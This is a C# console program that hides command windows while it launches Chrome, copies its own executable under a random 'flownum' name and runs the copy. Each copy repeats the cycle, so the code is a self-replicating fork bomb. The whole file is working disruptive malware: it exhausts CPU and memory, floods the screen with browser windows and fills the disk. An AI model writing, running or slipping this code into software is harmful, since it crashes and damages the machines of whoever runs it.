using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace flow
{
    class Program
    {
        static void Main(string[] args)
        {
            string location = System.Reflection.Assembly.GetEntryAssembly().Location;
            string _assembly = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + ".exe";
            string a = location.Replace(_assembly, "");
           
            int limit = 1;
            int i = 0;
            while (i<= limit)
                {i++;
                Random r = new Random();
                int genRand = r.Next(0, 500000000);
                Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                cmd.StandardInput.WriteLine("start chrome");
                cmd.StandardInput.WriteLine("xcopy "+location+" flownum"+ genRand + ".exe");
                cmd.StandardInput.WriteLine("F");
                cmd.StandardInput.WriteLine("A");
                
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                cmd.WaitForExit();
                Console.WriteLine(cmd.StandardOutput.ReadToEnd());

                Process cmd2 = new Process();
                cmd2.StartInfo.FileName = "cmd.exe";
                cmd2.StartInfo.RedirectStandardInput = true;
                cmd2.StartInfo.RedirectStandardOutput = true;
                cmd2.StartInfo.CreateNoWindow = true;
                cmd2.StartInfo.UseShellExecute = false;
                cmd2.Start();
                cmd2.StandardInput.WriteLine(a + "flownum" + genRand + ".exe");


                cmd2.StandardInput.Flush();
                cmd2.StandardInput.Close();
                cmd2.WaitForExit();
                Console.WriteLine(cmd2.StandardOutput.ReadToEnd());
            }
          
            Console.ReadLine();
            
        }
    }
}
